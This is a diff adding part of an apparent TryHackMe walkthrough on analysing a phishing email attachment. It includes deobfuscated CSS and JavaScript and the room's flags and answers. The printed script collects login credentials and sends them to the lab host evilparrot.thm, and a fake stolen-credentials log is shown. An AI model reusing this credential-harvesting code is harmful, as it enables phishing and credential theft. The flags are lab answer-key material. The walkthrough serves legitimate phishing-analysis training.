@@ -272,3 +272,277 @@ input[type=text]{
 }
 input[type=text]{
     border-bottom-color:#ccc;
+}
+input[type=text]{
+    border-right-color:#ccc;
+}
+input[type=text]{
+    border-top-color:#ccc;
+}
+form{
+    margin-top:37.5pt;
+}
+input[type=text]{
+    border-image:none;
+}
+form{
+    padding-bottom:15pt;
+}
+input[type=text],input[type=password]{
+    border-radius:.041666667in;
+}
+form{
+    padding-top:15pt;
+}
+input[type=password],input[type=text]{
+    box-sizing:border-box;
+}
+button{
+    background-color:#4caf50;
+}
+button{
+    color:#fff;
+}
+button{
+    padding-bottom:10.5pt;
+}
+button{
+    padding-top:10.5pt;
+}
+button{
+    margin-left:0;
+}
+button{
+    margin-bottom:6pt;
+}
+button{
+    margin-right:0;
+}
+button{
+    margin-top:6pt;
+}
+button{
+    border-left-width:medium;
+}
+button{
+    border-bottom-width:medium;
+}
+button{
+    border-right-width:medium;
+}
+input[type=password]{
+    border-left-width:.75pt;
+}
+input[type=password]{
+    border-bottom-width:.75pt;
+}
+input[type=password]{
+    border-right-width:.75pt;
+}
+input[type=password]{
+    border-top-width:.75pt;
+}
+input[type=password]{
+    border-left-style:solid;
+}
+button{
+    border-top-width:medium;
+}
+input[type=password]{
+    border-bottom-style:solid;
+}
+button{
+    border-left-style:none;
+}
+input[type=password]{
+    border-right-style:solid;
+}
+input[type=password]{
+    border-top-style:solid;
+}
+input[type=password]{
+    border-left-color:#ccc;
+}
+input[type=password]{
+    border-bottom-color:#ccc;
+}
+input[type=password]{
+    border-right-color:#ccc;
+}
+input[type=password]{
+    border-top-color:#ccc;
+}
+button{
+    border-bottom-style:none;
+}
+button{
+    border-right-style:none;
+}
+button{
+    border-top-style:none;
+}
+input[type=password]{
+    border-image:none;
+}
+button:hover{
+    background-color:#45a049;
+}
+button{
+    border-left-color:currentColor;
+}
+button{
+    border-bottom-color:currentColor;
+}
+label[class~=checkbox]{
+    display:inline-block;
+}
+button{
+    border-right-color:currentColor;
+}
+label[class~=checkbox]{
+    margin-bottom:.75pc;
+}
+button{
+    border-top-color:currentColor;
+}
+button{
+    border-image:none;
+}
+button{
+    border-radius:3pt;
+}
+button{
+    cursor:pointer;
+}
+button{
+    width:100%;
+}
+</style>
+```
+*CSS Beautify*
+### Task 7  JavaScript Obfuscation
+So far, we have uncovered that the attached .htm file renders an HTML login form, and an inline stylesheet is used to define the webpage's design. However, where is the login form sending its captured data? And what happens after we submit credentials? To find these answers, we must look at the final piece of this file inside the `<script>` tag.
+JavaScript is often used in login forms to perform client-side form validation asynchronously and to send the user's credentials to the server for authentication. As a running theme with this file, there are some hoops we need to jump through first to make it readable.
+JavaScript Beautify
+This JavaScript code has been minified, removing any unnecessary characters and whitespace. Fortunately, we can "beautify" this code by copying everything between the opening `<script>` and closing `</script>` tags, pasting it into the input of [Beautifier.io](https://beautifier.io/) and clicking **Beautify Code**. Alternatively, we can leverage [CyberChef's](https://gchq.github.io/CyberChef/) "JavaScript Beautify" operation to accomplish the same result.
+_Click to enlarge the image._
+We can then copy and replace the output in our file with the original JavaScript code we copied. Now that we have readable code, the author accidentally left over some verbose comments that help us understand what each statement is doing. Use this and some external JavaScript research to answer the questions below.
+Answer the questions below
+```text
+https://beautifier.io/
+
+<script>
+    const form = document.getElementById("login-form");
+const loginButton = document.getElementById("login-button");
+let errorMessage = null;
+form.addEventListener("submit", (event) => {
+    /*prevent the form from submitting normally*/
+    event.preventDefault(); /*get the username and password input values and set them to variables*/
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value; /*create a new HTTP request object for our evil server*/
+    const xhr = new XMLHttpRequest(); /*encode the email and password using encodeURIComponent*/
+    const encodedEmail = encodeURIComponent(email);
+    const encodedPassword = encodeURIComponent(password); /*add the encoded email and password as query parameters in the GET request*/
+    const url = `http://evilparrot.thm:8080/cred-capture.php?email=${encodedEmail}&password=${encodedPassword}`;
+    xhr.open("GET", url, true); /*send the GET request to the evil server*/
+    xhr.send();
+    if (errorMessage) {
+        errorMessage.innerHTML = "Sorry, there was an error processing your request. Please try again later.";
+    } else {
+        errorMessage = document.createElement("div");
+        errorMessage.innerHTML = "Sorry, there was an error processing your request. Please try again later.";
+        errorMessage.style.color = "red";
+        errorMessage.style.fontSize = "12px";
+        form.insertBefore(errorMessage, loginButton.nextSibling);
+    }
+}); /*redirect to the REAL PostParrot website after sending, so the victim doesn't get suspicious! //window.location.href = "https://www.postparrot.thm";*/ < /script>
+```
+What is the URL that receives the login request when the login form is submitted?
+*http://evilparrot.thm:8080/cred-capture.php*
+What is the JavaScript property that can redirect the browser to a new URL?
+*window.location.href*
+### Task 8  Putting It All Together
+Start Machine
+Through our investigation, we manually decoded and inferred the true nature of this webpage. To summarize, this is a login page that impersonates the legitimate ParrotPost website to capture user credentials for malicious purposes. The JavaScript code listens for the login form submission event and sends an HTTP GET request to another URL location, which is clearly not the _actual_ ParrotPost login endpoint.
+Detonating the Form
+Interacting with this malicious webpage isn't something you usually want to do (unless you are in a controlled sandbox environment), but let's demonstrate what happens when a victim falls for this phishing website! This will help us study the behaviour of the document and its potential impact on a real system (and victim) without actually infecting or harming any systems.
+First, click **Start Machine** at the top of this task. This will open up the VM in a split-screen browser window. If the VM is not visible, click the blue **Show Split View** button at the top-right of the page. Once you are brought to the desktop, open the original `ParrotPostACTIONREQUIRED.htm` document in the VM's web browser (right-click, and select **Open With Firefox Web Browser**).
+**Note:** For this task, please ensure you are using the VM attached to this task, rather than the AttackBox.
+You should be directed to the following HTML page in your browser:
+As suspected, this is a credential capture login page, and it appears Paul's email address has already been filled in under the **Email** field. This is a common familiarity tactic to have a victim think a site has remembered or cached their username, helping to create trust. It also reveals that this is likely a targeted phishing campaign, and since Paul is a senior executive, this may specifically be a [Whaling attack](https://www.ncsc.gov.uk/guidance/whaling-how-it-works-and-what-your-organisation-can-do-about-it).
+Let's change the value of the **Email** and **Password** fields to represent fake credentials, as this will probably be logged on the attacker's server. Then, click **Login**.
+Upon submitting our phony credentials, the website returns an error message claiming an error processing our login request. However, that might not be the case; this may be a "fake" error message that attackers use to ease suspicion, whereas, in reality, our request containing credentials did go through in the background (through the beauty of asynchronous JavaScript).
+Check the Network Requests
+By checking the **Network** tab in the browser's **Developer Tools**, we can quickly determine whether submitting the form sent a successful HTTP GET request. To open the Developer Tools menu, right-click on the page and select **Inspect**. Once the tab is open, click on the **Network** tab.
+From here, we only need to click the **Login** button to submit the form again. You should suddenly see a GET request appear!
+Our browser successfully established the connection to the `evilparrot.thm` web server and included our credentials as query parameters in the GET request to `/cred-capture.php`.
+Clicking on the listed request will give us more details in the right-hand panel. We can navigate between different tabs to view information, such as the request and response headers. The **Response** tab will show any response content, such as the HTML, JSON, or XML response body. Sometimes this can give us more information about how the web server handles the request, depending on how verbose the server-side code is designed.
+Play around by testing a request and analyzing the response. You may find some interesting information to help answer the questions below.
+Answer the questions below
+```text
+https://www.ncsc.gov.uk/guidance/whaling-how-it-works-and-what-your-organisation-can-do-about-it
+
+THM{c4p7ur3d_y0ur_cr3d5} Status: SUCCESS! Credentials have been stolen and appended to http://evilparrot.thm:8080/creds.txt
+
+http://evilparrot.thm:8080/creds.txt
+
+ - Email Address: 'mhoppus72@gmail.com', Password: 'carousel182'
+ - Email Address: 'chris.smith@zebramail.com', Password: 'FlyL1ke!A~Bird'
+ - Email Address: 'sara.jackson@acme.com', Password: 'H3ll0W0rld!'
+ - Email Address: 'mike.wilson@outlook.com', Password: 'P@ssw0rd!'
+ - Email Address: 'jessica.parker@googlemail.com', Password: 'qwerty123'
+ - Email Address: 'steven.roberts@protonmail.com', Password: '1LoveM3!'
+ - Email Address: 'karen.white@icloud.com', Password: 'Pa55word'
+ - Email Address: 'brian.douglas@yandex.com', Password: 'secret123'
+ - Email Address: 'diane.thompson@yahoo.com', Password: '12345678'
+ - Email Address: 'william.clark@aol.com', Password: 'H3ll0P@ss'
+ - Email Address: 'laura.brown@inbox.com', Password: 'P@ssword123'
+ - Email Address: 'peter.davies@live.com', Password: 'letmein1'
+ - Email Address: 'katie.foster@rediffmail.com', Password: 'd0glover!'
+ - Email Address: 'adam.miller@mail.com', Password: 'mysecret11'
+ - Email Address: 'test@test.com', Password: 'test'
+ - Email Address: 'test@test.com', Password: 'test'
+```
+![[Pasted image 20230807202545.png]]
+What is the flag you receive after sending fake credentials to the /cred-capture.php endpoint?
+What is the path on the web server hosting the log of captured credentials?
+*/creds.txt*
+Based on the log, what is Chris Smith's password?
+*FlyL1ke!A~Bird*
+### Task 9  Conclusion
+You should now better understand how to identify and analyze phishing attacks that attempt to steal user credentials. You have learned to use various tools to inspect and analyze suspicious emails and attachments and recognize and decode different obfuscation techniques used in malicious HTML, CSS, and JavaScript code.
+Remember, the analysis doesn't end here; it's always a good idea to report malicious domains and IP addresses to help protect yourself and others from future attacks. Domain registrars typically have a Registrar Abuse Contact, which can be found by performing a [WhoIs](https://www.whois.com/whois/) lookup of the malicious domain. Malicious IPs can be reported through the appropriate Internet Service Provider (ISP) or hosting provider.
+Answer the questions below
+```text
+https://www.whois.com/whois/evilparrot.com
+
+not taken Registrar Abuse Contact Email: abuse@NameBright.com
+```
+Walkthrough complete!
+Completed
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/adebd9732d92ad4a1445744edf90e2cf.png)
+- ![The suspicious email Paul received in his email client.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/6a3db93c263d2f450c9d5131e95622c2.png)
+- ![Labelled diagram mapping the components the email's screenshot to common headers found in the OWA email client.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/784ae7675403e49d2f41f67a27b551c5.png)
+- ![Received header information for Paul's email, indicating an IP address of 109.205.120.0](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/2b448337d00799c72eceb541e8706218.png)
+- ***THM{y0u_f0und_7h3_h34d3r}***
+- ![Sublime Text output indicating that this attachment's filename is set to ParrotPostACTIONREQUIRED.html with a text/html Content-Type](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/dfdd050be423941147bcc20e33f9c2c2.png)
+- ![SublimeText code, demonstrating that the attached HTM file has been base64 encoded.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/dafbe4dce3a476fa106c73f226bee7da.png)
+- ![CyberChef dashboard, base64 decoding the string from the HTM attachment file.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/d14814855498e788a28dcdc7663bcc98.png)
+- ***THM{d0ubl3_3nc0d3d}***
+- ![CyberChef dashboard, HTML entity decoding the string from the HTM attachment file.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/557e5fc2e65fcf541fd4854daa9e1a41.png)
+- ![SublimeText indicating the current status of the HTML file, after the above actions have been performed.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/81a9cb2ae974b3b2e58ae3a7b37d02e5.png)
+- ![Graphic diagram displaying the difference between CSS before and after modification.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/81f1222e7a0b8c3cc3f60dca365d71db.png)
+- ![The Beautifier.io webpage indicating the output after the JavaScript section has been beautified.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/439dfdb147dca6905ea976ad8d8e2f86.png)
+- ![The desktop of attached VM, highlighting the Open with Firefox context menu option.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/a411b94fae8448d345ab786ac80af3ac.png)
+- ![The rendered phishing webpage in the browser.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/b0bc92ff9bf50bd4fa9dd201880c27a3.png)
+- ![The error message on the rendered phishing webpage, after entering fake credentials and clicking Login.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/7ee37664331ca72f569b074eab318772.png)
+- ![The browser's Network tab, showing no requests.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/42359006265cf048550e851106e89808.png)
+- ![The browser's Network tab, showing a GET request to evilparrot.thm](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/5c1e8262a5307b2858e0decef29a3f96.png)
+- ![The network request's details pane, indicating that the user credentials were sent to the webserver as URL parameters.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/24ad269d388cb9f498b10586e2f33040.png)
+- ***THM{c4p7ur3d_y0ur_cr3d5}***
+
+## Notes / Lessons Learned
+[[OWASP Broken Access Control]]
+
